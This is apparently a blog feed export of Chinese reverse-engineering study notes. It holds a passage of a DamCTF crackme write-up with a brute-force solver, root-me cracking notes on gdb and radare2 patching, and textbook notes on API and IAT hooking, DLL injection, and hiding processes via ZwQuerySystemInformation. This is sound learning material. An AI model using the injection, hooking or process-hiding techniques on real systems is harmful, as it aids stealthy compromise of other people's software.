遇到/0结束</span></span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">     v1 += v3 ^ s[i];        <span class="comment">//将随机值与字符异或，结果相加要为291</span></span><br><span class="line">   <span class="keyword">if</span> ( v1 == <span class="number">291</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">&quot;Such a cool sentence!&quot;</span>);</span><br><span class="line">     byte_20203C = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">&quot;Not a big fan of that sentence&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>注释已经写在代码中，接下来，就是编程破解得到符合的字符串。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        <span class="comment">/*FILE *pe=NULL;</span></span><br><span class="line"><span class="comment">        char s[1]=&#123;&#x27;1&#x27;&#125;;</span></span><br><span class="line"><span class="comment">        pe=popen(&quot;nc chals.damctf.xyz 31932&quot;,&quot;rw&quot;);</span></span><br><span class="line"><span class="comment">        if(pe==NULL)</span></span><br><span class="line"><span class="comment">                cout&lt;&lt;&quot;connect failed&quot;&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">        while (1)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">                fwrite(s,sizeof(s),1,pe);</span></span><br><span class="line"><span class="comment">                fgets(s,20,pe);</span></span><br><span class="line"><span class="comment">                cout&lt;&lt;s;</span></span><br><span class="line"><span class="comment">                break;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        pclose(pe);*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> a=<span class="number">1602480388</span>;<span class="comment">//1111638594</span></span><br><span class="line">        srand(a); </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;rand()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v3 = rand() % <span class="number">10</span> + <span class="number">65</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;v3=&quot;</span>&lt;&lt;v3&lt;&lt;<span class="built_in">endl</span>; <span class="comment">//=74</span></span><br><span class="line">        <span class="keyword">int</span> remain=<span class="number">291</span>; <span class="comment">//291下搜索</span></span><br><span class="line">        <span class="keyword">int</span> qu=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> resu;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;  <span class="comment">//最大允许输入31个字符</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">58</span>;j++)&#123; <span class="comment">//从A开始搜索</span></span><br><span class="line">                        resu=v3^<span class="keyword">int</span>(<span class="string">&#x27;A&#x27;</span>+j);</span><br><span class="line">                        <span class="keyword">if</span>(resu==<span class="number">0</span>) <span class="comment">//==0没有用</span></span><br><span class="line">                                &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> ( resu&lt;remain || remain%resu==<span class="number">0</span>)&#123; <span class="comment">//实际上感觉不用加后面的条件</span></span><br><span class="line">                                qu+=remain/resu; <span class="comment">//累计得到的字符数</span></span><br><span class="line">                                <span class="keyword">if</span>(qu&gt;<span class="number">31</span>)&#123; <span class="comment">//不能大于31</span></span><br><span class="line">                                        qu-=remain/resu;</span><br><span class="line">                                        <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;remain/resu;k++) <span class="comment">//输出成功的字符</span></span><br><span class="line">                                        <span class="built_in">cout</span>&lt;&lt;<span class="keyword">char</span>(<span class="string">&#x27;A&#x27;</span>+j);</span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                remain=remain%resu; <span class="comment">//更新余下值</span></span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;i=  &quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;   &quot;</span>&lt;&lt;<span class="string">&quot;resu=&quot;</span>&lt;&lt;resu&lt;&lt;<span class="string">&quot;qu= &quot;</span>&lt;&lt;qu&lt;&lt;<span class="string">&quot;remain=&quot;</span>&lt;&lt;remain&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                i=qu<span class="number">-1</span>; <span class="comment">//更新i</span></span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;after i= &quot;</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (remain==<span class="number">0</span>) <span class="comment">//填满291 成功</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;find&quot;</span>&lt;&lt;<span class="string">&quot;i=&quot;</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(i&gt;=<span class="number">31</span>) <span class="comment">//最后都没有搜索到，失败</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">&quot;don&#x27;t find&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;remainder= &quot;</span>&lt;&lt;remain&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输入字符，成功解锁。</p><img src="https://s1.ax1x.com/2020/10/12/0Rlsts.jpg" alt="0Rlsts.jpg" border="0" /><p>最后flag文件在远程服务器，但链接时间很短，可能需要脚本自动化发送，有点小难😢</p><hr><h4 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h4><p>C 库函数 char *fgets(char *str, int n, FILE *stream) 从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</p><h4 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h4><p>C 库函数 size_t strlen(const char *str) 计算字符串 str 的长度，直到空结束字符，但不包括空结束字符。</p><h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>不愧是新手题，只是最后编程花了我不少时间。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;damCTF-rev-schlage-beginner-WP&quot;&gt;&lt;a href=&quot;#damCTF-rev-schlage-beginner-WP&quot; class=&quot;headerlink&quot; title=&quot;damCTF- rev/schlage (beginner) __WP&quot;&gt;&lt;/a&gt;damCTF- rev/schlage (beginner) __WP&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;先用&lt;code&gt;file&lt;/code&gt;命令查看&lt;/p&gt;
&lt;img src=&quot;https://s1.ax1x.com/2020/10/12/0Rkyfe.jpg&quot; alt=&quot;0Rkyfe.jpg&quot; border=&quot;0&quot; /&gt;
可以看到是64位的ELF文件,debug信息还在
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;接着使用radare2反汇编&lt;/p&gt;
&lt;img src=&quot;https://s1.ax1x.com/2020/10/12/0RE8xJ.jpg&quot; alt=&quot;0RE8xJ.jpg&quot; border=&quot;0&quot; /&gt;

&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用&lt;code&gt;VV&lt;/code&gt;命令进入视图模式&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>逆向_root_me_3</title>
    <link href="http://finsenty54.github.io/2020/10/08/%E9%80%86%E5%90%91_root_me_3/"/>
    <id>http://finsenty54.github.io/2020/10/08/%E9%80%86%E5%90%91_root_me_3/</id>
    <published>2020-10-08T12:21:43.000Z</published>
    <updated>2020-10-31T08:53:12.096Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x86-No-software-breakpoints"><a href="#ELF-x86-No-software-breakpoints" class="headerlink" title="ELF x86 - No software breakpoints"></a>ELF x86 - No software breakpoints</h2><h3 id="看反汇编，大致了解过程"><a href="#看反汇编，大致了解过程" class="headerlink" title="看反汇编，大致了解过程"></a>看反汇编，大致了解过程</h3><p>这是众所周知的<code>反调试</code>技术，它不能在应用程序本身中<code>放置任何软件断点</code>。因为当我们在<code>用户模式</code>应用程序中遇到<code>断点</code>时，代码中将放入<code>0xCC（int3）</code>，因此计算将是错误的，并将生成错误的<code>校验和</code>.</p><a id="more"></a><p>这是在ecx中计算一种散列值，它基于入口点的整个代码。如果我们对函数进行任何更改，值将不再相同，从而阻止我们编辑二进制文件.</p><p>计算整个<code>text 指令的和</code>，所以放入<code>0xCC</code>会 报错，也就是改变的指令。</p><hr><h3 id="移位运算符"><a href="#移位运算符" class="headerlink" title="移位运算符"></a>移位运算符</h3><p>a&lt;&lt;3<br><code>a的内容不改变</code></p><p><code>edx &amp; 0xff</code><br>取最后8位</p><hr><h3 id="g"><a href="#g" class="headerlink" title="g++"></a>g++</h3><pre><code>g++主要用来编译c++文件，g++编译c++文件是会连接libc++。gcc主要用来编译c文件，也可编译c++，但gcc编译c++文件默认不连接libc++。</code></pre><hr><h3 id="移位"><a href="#移位" class="headerlink" title="移位"></a>移位</h3><p>移位时，移出的位数全部丢弃，移出的空位补入的数与左移还是右移有关。如果是<code>左移</code>，则规定补入的数全部是<code>0</code>；如果是<code>右移</code>，还与被移位的数据是否带<code>符号</code>有关。若是<code>不带符号数</code>，则补入的数全部为<code>0</code>；若是<code>带符号数</code>，则补入的数全部等于原数的最左端位上的原数(即<code>原符号位</code>)</p><hr><h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p>引入了命名空间这个概念，它可作为<code>附加信息来区分</code>不同库中相同名称的函数、类、变量等。使用了命名空间即定义了上下文。本质上，命名空间就是定义了<code>一个范围</code>。</p><p>可以使用 <code>using namespace</code> 指令，这样在使用命名空间时就可以<code>不用在前面加上</code>命名空间的名称。这个指令会告诉编译器，后续的代码将使用指定的命名空间中的名称。</p><hr><h2 id="ELF-x86-CrackPass"><a href="#ELF-x86-CrackPass" class="headerlink" title="ELF x86 - CrackPass"></a>ELF x86 - CrackPass</h2><p><code>gdb-peda$ help x</code><br>Examine memory: x/FMT ADDRESS.</p><hr><p><code>gdb-peda$ print/t $ebx</code><br>二进制打印寄存器</p><hr><pre><code>set $ZF = 6set $eflags |= (1 &lt;&lt; $ZF)</code></pre><p>设定ZF值为1</p><hr><p><code>show</code></p><hr><p><code>where</code><br>显示当前位置</p><hr><p><code>MOVZX</code> 指令（进行全零扩展并传送）将源操作数复制到目的操作数，并把目的操作数 扩展到 16 位或 32 位。</p><hr><h3 id="r2-图形模式下，如何跳转和返回函数"><a href="#r2-图形模式下，如何跳转和返回函数" class="headerlink" title="r2 图形模式下，如何跳转和返回函数"></a>r2 图形模式下，如何跳转和返回函数</h3><p>图形模式下，按<code>o</code>进行跳转<br>按<code>u</code>返回上一个函数</p><hr><p>ff07031d6fb052490149f44b1d5e94f1592b6bac93c06ca9</p><p>25260060504_VE_T25_<em>t</em>_</p><hr><p><code>Usage: jump LOCATION</code><br>Give as argument either LINENUM or *ADDR, where ADDR is an express</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x86-No-software-breakpoints&quot;&gt;&lt;a href=&quot;#ELF-x86-No-software-breakpoints&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - No software breakpoints&quot;&gt;&lt;/a&gt;ELF x86 - No software breakpoints&lt;/h2&gt;&lt;h3 id=&quot;看反汇编，大致了解过程&quot;&gt;&lt;a href=&quot;#看反汇编，大致了解过程&quot; class=&quot;headerlink&quot; title=&quot;看反汇编，大致了解过程&quot;&gt;&lt;/a&gt;看反汇编，大致了解过程&lt;/h3&gt;&lt;p&gt;这是众所周知的&lt;code&gt;反调试&lt;/code&gt;技术，它不能在应用程序本身中&lt;code&gt;放置任何软件断点&lt;/code&gt;。因为当我们在&lt;code&gt;用户模式&lt;/code&gt;应用程序中遇到&lt;code&gt;断点&lt;/code&gt;时，代码中将放入&lt;code&gt;0xCC（int3）&lt;/code&gt;，因此计算将是错误的，并将生成错误的&lt;code&gt;校验和&lt;/code&gt;.&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>逆向_root_me_2</title>
    <link href="http://finsenty54.github.io/2020/10/07/%E9%80%86%E5%90%91_root_me_2/"/>
    <id>http://finsenty54.github.io/2020/10/07/%E9%80%86%E5%90%91_root_me_2/</id>
    <published>2020-10-07T06:27:22.000Z</published>
    <updated>2020-10-31T08:53:12.096Z</updated>
    
    <content type="html"><![CDATA[<h2 id="逆向-root-me"><a href="#逆向-root-me" class="headerlink" title="逆向 root_me"></a>逆向 root_me</h2><h3 id="PE-NET"><a href="#PE-NET" class="headerlink" title="PE .NET"></a>PE .NET</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection">https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection</a></p><a id="more"></a><h3 id="MIPS-ELF-MIPS-Basic-Crackme"><a href="#MIPS-ELF-MIPS-Basic-Crackme" class="headerlink" title="MIPS. ELF MIPS - Basic Crackme"></a>MIPS. ELF MIPS - Basic Crackme</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme">https://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme</a></p><p>在MIPS架构中，“ $ ra”寄存器保存返回地址，类似于x86指令指针“ EIP”</p><h3 id="ELF-fake-instrucations"><a href="#ELF-fake-instrucations" class="headerlink" title="ELF  fake instrucations"></a>ELF  fake instrucations</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints">https://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints</a></p><pre><code>dis main  gdb-peda$ set disassembly-flavor intel //汇编用intel语言显示gdb-peda$ i r $edx //显示edx值ni //ni/si都是汇编级别的断点定位。si会进入汇编和C函数内部,ni不会//这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码</code></pre><p><code>jz</code> 表示当<code>zf =1 </code>时跳转，即结果为0跳转。<br><code>jnz</code> 即 <code>zf=0 </code>时跳转，即结果不为0 跳转。</p><pre><code>gdb-peda$ i r //全显示gdb-peda$ set $eax=0gdb-peda$ x/s $eax //查看寄存器指向的内容call WPA(&quot;toto&quot;, &quot;toto&quot;) //直接在gdb中运行命令？？</code></pre><h3 id="ELF-ptrace"><a href="#ELF-ptrace" class="headerlink" title="ELF ptrace"></a>ELF ptrace</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace">https://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace</a></p><p><em>Load the application into <code>IDA pro</code>,search main function,press <code>F5 </code>to disassemble it,get the code below:</em><br><code>IDA 按F5 反编译 生成伪代码</code></p><hr><p><code>r2 -ww ./ch3.bin</code></p><pre><code> -w           open file in write mode ww foobar            write wide string &#39;f\x00o\x00o\x00b\x00a\x00r\x00&#39; wx 9090     write two intel nops</code></pre><p><code>[0x080482f0]&gt; wx eb @ 0x0804841A</code><br>Short Jump（短跳转）机器码 EB</p><p><code>pd N             disassemble N instructions</code></p><pre><code>gdb-peda$ i b set $al=$dl </code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;逆向-root-me&quot;&gt;&lt;a href=&quot;#逆向-root-me&quot; class=&quot;headerlink&quot; title=&quot;逆向 root_me&quot;&gt;&lt;/a&gt;逆向 root_me&lt;/h2&gt;&lt;h3 id=&quot;PE-NET&quot;&gt;&lt;a href=&quot;#PE-NET&quot; class=&quot;headerlink&quot; title=&quot;PE .NET&quot;&gt;&lt;/a&gt;PE .NET&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection&quot;&gt;https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>逆向工程核心原理_little_summary</title>
    <link href="http://finsenty54.github.io/2020/10/06/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86_little_summary/"/>
    <id>http://finsenty54.github.io/2020/10/06/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86_little_summary/</id>
    <published>2020-10-06T06:18:05.000Z</published>
    <updated>2020-10-31T08:53:12.096Z</updated>
    
    <content type="html"><![CDATA[<h3 id="INT-和-IAT"><a href="#INT-和-IAT" class="headerlink" title="INT 和 IAT"></a>INT 和 IAT</h3><p>INT  是rva数组，INT表示数组首地址 数组元素是一个地址 指向由一个2字节ordinall地址和函数名称组成的结构体  第一个值地址指向第一个结构体</p><p>如果IAT存在于 选择头中IAT表明的地址中 相应没有写权限也没事</p><p>INT和IAT指向内容有时相同 表示地址肯定不同 因为保存在不同地址 所指内容相同</p><a id="more"></a><hr><h3 id="进程内存转储"><a href="#进程内存转储" class="headerlink" title="进程内存转储"></a>进程内存转储</h3><p>OLLYGDB插件？？ dump命令<br>是解压缩运行时，将内存转为文件，方便查看</p><hr><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>使用CALL指令将接下来的在代码间的字符串数据地址压入栈，然后直接接下来运行命令</p><p>CALL EAX<br>EAX保存函数地址<br>32位保存返回内容</p><hr><h3 id="top-命令-linux"><a href="#top-命令-linux" class="headerlink" title="top 命令 (linux)"></a>top 命令 (linux)</h3><p>查看 CPU 时间在 User space 与 Kernel Space 之间的分配情况</p><hr><h3 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h3><p>ollydbg VIEW-SEH CHAIN</p><hr><h3 id="API钩取"><a href="#API钩取" class="headerlink" title="API钩取"></a>API钩取</h3><p>windows 中内核模式所有代码共用一个虚拟空间地址，用API传<br>e1 = 9Fh =&gt; 0fh*2^7 = 780h</p><p>使用常规系统资源的API会经由kernel32.dll和ntdll.dll不断向下调用，最后经由SYSENTER命令进入内核模式</p><p><img src="https://s1.ax1x.com/2020/10/06/0N35f1.png" alt="0N35f1.png"></p><hr><p><img src="https://s1.ax1x.com/2020/10/06/0N3vtA.png" alt="0N3vtA.png"></p><hr><h3 id="动态方法常用-调试和注入"><a href="#动态方法常用-调试和注入" class="headerlink" title="动态方法常用 调试和注入"></a>动态方法常用 调试和注入</h3><h4 id="方法1：调试"><a href="#方法1：调试" class="headerlink" title="方法1：调试"></a>方法1：调试</h4><p>异常必须处理为EXCEPTION_BREAKPOINT 汇编指令为int 3 IA-32指令为0xCC </p><p>用异常获取API的控制</p><p>线程上下文，（执行完一个线程时间片，执行另一个），也就是各个寄存器信息，保存在CONTEXT结构体中。</p><p>CONTEXT.esp</p><p>api钩取 获取某个API的控制权</p><h4 id="方法2：DLL注入"><a href="#方法2：DLL注入" class="headerlink" title="方法2：DLL注入"></a>方法2：DLL注入</h4><p>setwindowstextA 表示ASCII<br>setwindowstextW 表示宽字符 win中为Unicode码</p><h3 id="IAT钩取"><a href="#IAT钩取" class="headerlink" title="IAT钩取"></a>IAT钩取</h3><p>通过注入DLL，修改IAT中指向某API的地址改为指向自己API的地址，自己的函数再去调用某API，来达到修改的目的</p><hr><h3 id="搜索API"><a href="#搜索API" class="headerlink" title="搜索API"></a>搜索API</h3><p><strong>在用ollydng进行内部模块call 搜索时，先选取对的模块。右键-select moudle</strong><br>在用ollydbg 中<code> search for name</code>命令</p><hr><h3 id="API代码修改"><a href="#API代码修改" class="headerlink" title="API代码修改"></a>API代码修改</h3><p>将API头五个字节 修改 为JMP XXXXXXXX<br>即跳转到注入的函数中</p><p>通过将ntdll.ZwQuerySystemInformation() 函数形成的链表中删除进程信息即可做到隐藏相关进程。</p><h3 id="全局API钩取"><a href="#全局API钩取" class="headerlink" title="全局API钩取"></a>全局API钩取</h3><p>通过修改ntdll.ZwResumeThread() API</p><h3 id="热补丁-hot-patch"><a href="#热补丁-hot-patch" class="headerlink" title="热补丁 hot patch"></a>热补丁 hot patch</h3><p>修改7字节代码<br>1.二次跳转<br>两字节跳到指令上面，用五字节跳到自己的函数地址<br>2.不用脱钩，地址+2字节，就可正常运行</p><p>ia-32 E9 表示far jmp 五字节。<br><code>E9 XXXXXXXX=要跳转的地址-当前指令地址-当前指令长度（5）</code></p><p>EB 表示 short jmp 两字节<br>依托当前EIP 在-128~127范围间跳转<br><code>XX=要跳转的地址-当前指令地址-当前指令长度（2）</code></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;INT-和-IAT&quot;&gt;&lt;a href=&quot;#INT-和-IAT&quot; class=&quot;headerlink&quot; title=&quot;INT 和 IAT&quot;&gt;&lt;/a&gt;INT 和 IAT&lt;/h3&gt;&lt;p&gt;INT  是rva数组，INT表示数组首地址 数组元素是一个地址 指向由一个2字节ordinall地址和函数名称组成的结构体  第一个值地址指向第一个结构体&lt;/p&gt;
&lt;p&gt;如果IAT存在于 选择头中IAT表明的地址中 相应没有写权限也没事&lt;/p&gt;
&lt;p&gt;INT和IAT指向内容有时相同 表示地址肯定不同 因为保存在不同地址 所指内容相同&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ch25.bin</title>
    <link href="http://finsenty54.github.io/2020/10/05/ch25bin/"/>
    <id>http://finsenty54.github.io/2020/10/05/ch25bin/</id>
    <published>2020-10-05T11:13:34.000Z</published>
    <updated>2020-10-31T08:53:12.100Z</updated>
    
    <content type="html"><![CDATA[<h2 id="逆向-root-me"><a href="#逆向-root-me" class="headerlink" title="逆向 root_me"></a>逆向 root_me</h2><h3 id="ch25-bin"><a href="#ch25-bin" class="headerlink" title="ch25.bin"></a>ch25.bin</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en">https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en</a></p><a id="more"></a><h4 id="识别C-类"><a href="#识别C-类" class="headerlink" title="识别C++类"></a>识别C++类</h4><p>如何识别软件是用C++所写？<br>1 频繁使用ECX 保存this 指针 ，指向类对象，如在调用函数前<br>2 虚函数 要先知道类虚函数表，然后得到实际值，也是传到ECX中<br>3 使用STL code 可用IDA imports查看</p><h4 id="类怎么在内存中存储"><a href="#类怎么在内存中存储" class="headerlink" title="类怎么在内存中存储"></a>类怎么在内存中存储</h4><p>每个变量四字节<br>不足要对齐<br>内存中排列与定义相同</p><hr><p>虚函数表要在最开头<br>表包含虚函数地址，按定义排序</p><p><strong>如果继承另一个类</strong></p><p>继承多个类<br><strong>虚表按顺序排序</strong></p><hr><h4 id="识别类"><a href="#识别类" class="headerlink" title="识别类"></a>识别类</h4><h5 id="1-识别构建和撤销"><a href="#1-识别构建和撤销" class="headerlink" title="1 识别构建和撤销"></a>1 识别构建和撤销</h5><h6 id="1-1-全局变量"><a href="#1-1-全局变量" class="headerlink" title="1.1 全局变量"></a>1.1 全局变量</h6><p>在编译时 保存到（PE）文件的数据段<br>构建在main()前调用</p><h6 id="用this调用全局变量，在EP和main-间，确定为构建"><a href="#用this调用全局变量，在EP和main-间，确定为构建" class="headerlink" title="用this调用全局变量，在EP和main()间，确定为构建"></a>用this调用全局变量，在EP和main()间，确定为构建</h6><p>1.2局部变量<br>指针指向未初始化的栈变量</p><h6 id="1-3动态分配变量-new-）"><a href="#1-3动态分配变量-new-）" class="headerlink" title="1.3动态分配变量 new(）"></a>1.3动态分配变量 new(）</h6><p>堆上分配</p><h5 id="2多态类识别"><a href="#2多态类识别" class="headerlink" title="2多态类识别"></a>2多态类识别</h5><h6 id="2-1鉴别多态通过RTTI，其可以让对象在运行时确定类型。"><a href="#2-1鉴别多态通过RTTI，其可以让对象在运行时确定类型。" class="headerlink" title="2.1鉴别多态通过RTTI，其可以让对象在运行时确定类型。"></a>2.1鉴别多态通过RTTI，其可以让对象在运行时确定类型。</h6><p>RTTICompleteObjectLocator pointer</p><hr><p>TypeDescriptor<br>指向的结构包含类名</p><hr><p>RTTIClassHierarchyDescriptor</p><hr><p>RTTIBaseClassDescriptor</p><hr><p>vftable<br>vbtable (virtual base class table)</p><hr><h3 id="指令E9"><a href="#指令E9" class="headerlink" title="指令E9 "></a>指令<code>E9 </code></h3><p>指令<code>E9 </code>相对寻址<br>e9 xxxxxxxx<br><code>xxxxxxxx=要跳转的地址-当前指令地址-当前指令长度（5）</code><br>e9 00 00 00 00  即跳转到下一个地址<br>402005-402000-5=000000</p><h3 id="指令EB"><a href="#指令EB" class="headerlink" title="指令EB"></a>指令<code>EB</code></h3><p><code>EB</code>表示short jmp命令，进行短距离跳转<br>eb xx</p><hr><h3 id="指令setne"><a href="#指令setne" class="headerlink" title="指令setne"></a>指令setne</h3><p><strong>set  if  not  equal</strong><br>setne cl<br>if ZF=1 then cl=0<br>if ZF=0 then cl=1</p><p>strings 命令<br>display printable strings in [file(s)] (stdin by default)</p><hr><h3 id="破解方法1"><a href="#破解方法1" class="headerlink" title="破解方法1"></a>破解方法1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./ch25.bin </span><br><span class="line">(gdb) <span class="built_in">set</span> args toto <span class="comment">//设置输入参数toto</span></span><br><span class="line">(gdb) b main <span class="comment">//在main设置断点</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x8048a95</span> </span><br><span class="line">(gdb) r  <span class="comment">//运行程序（到断点）</span></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x08048a95</span> <span class="function">in <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span>disass <span class="comment">//显示汇编代码</span></span></span><br><span class="line">(gdb) b *main+268</span><br><span class="line">gdb)c 继续执行</span><br><span class="line">(gdb) layout prev 可以查看堆栈和汇编代码</span><br><span class="line">(gdb) x/<span class="number">1</span>xw $eax</span><br><span class="line">“ x / <span class="number">1</span>xw $ eax命令在EAX寄存器中包含的地址处显示<span class="number">1</span>个十六进制格式的<span 